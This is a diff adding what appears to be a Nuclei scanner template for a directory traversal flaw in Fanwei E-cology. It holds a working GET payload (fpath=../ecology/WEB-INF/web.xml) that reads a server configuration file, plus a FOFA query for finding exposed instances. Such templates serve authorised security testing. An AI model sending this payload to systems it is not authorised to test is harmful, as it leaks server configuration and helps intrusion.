@@ -1,0 +1,24 @@
+id: fanwei-e-cology-filedownload-directory-traversal
+info:
+  name: Fanwei E-cology Directory Traversal
+  author: zp857
+  severity: medium
+  reference: https://moresec.yuque.com/iixlqz/wnv3e6/muc8pk
+  tags: fanwei-e-cology,lfi
+  metadata:
+    fofa-query: 'body="泛微协同" || body="wev8" || body="ecology" || body="e-cology" || body="wui/index.html" || header="ecology_JSessionId"'
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/weaver/ln.FileDownload?fpath=../ecology/WEB-INF/web.xml"
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "<url-pattern>/weaver/"
+        part: body
